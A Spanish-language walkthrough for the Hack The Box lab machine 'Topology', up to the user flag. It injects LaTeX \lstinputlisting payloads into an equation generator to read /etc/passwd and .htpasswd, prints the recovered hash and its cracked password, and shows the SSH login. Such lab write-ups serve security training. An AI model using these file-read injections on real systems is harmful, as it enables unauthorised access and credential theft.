<p align="center">
  <a href="https://github.com/DenverCoder1/readme-typing-svg"><img src="https://readme-typing-svg.herokuapp.com?size=50&color=19AC26FF&width=500&height=80&lines=Topology"></a>
</p>

**Online:** https://app.hackthebox.com/machines/546

**Paso 1:**

Primero vamos a editar el fichero etc/hosts y agregar el sgiuiente dominio:

```
10.10.11.217    latex.topology.htb
```

<p align="center">
<img src="./Img/dominio.png">
</p>

**Paso 2:**

Ahora vamos a acceder en **LaTeX Equation Generator** y nos pedira que ingresemos un código de látex y vamos a ingresar en orden los siguientes codigos:

<p align="center">
<img src="./Img/latex.png">
</p>

```latex
$\lstinputlisting{/etc/passwd}$

$\lstinputlisting{/var/www/dev/.htaccess}$

$\lstinputlisting{/var/www/dev/.htpasswd}$
```

nos dara un hash, creamos un archivo sin extencion y guardamos el hash **vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0**

<p align="center">
<img src="./Img/hash.png">
</p>

```
nano hash
```

**Paso 3:**

Ahora usaremos John the Ripper para decifrar el hash

```
sudo john hash --show
```

nos dara como usuario y contraseña **vdaisley:calculus20**

**Paso 4:**

Ahora vamosa conectarnos mediante ssh ingresando la contraseña que obtuvimos:

```
sudo ssh vdaisley@10.10.11.217
```

por ultimo leemos el archivo **user.txt** y nos dara como resultado la bandera.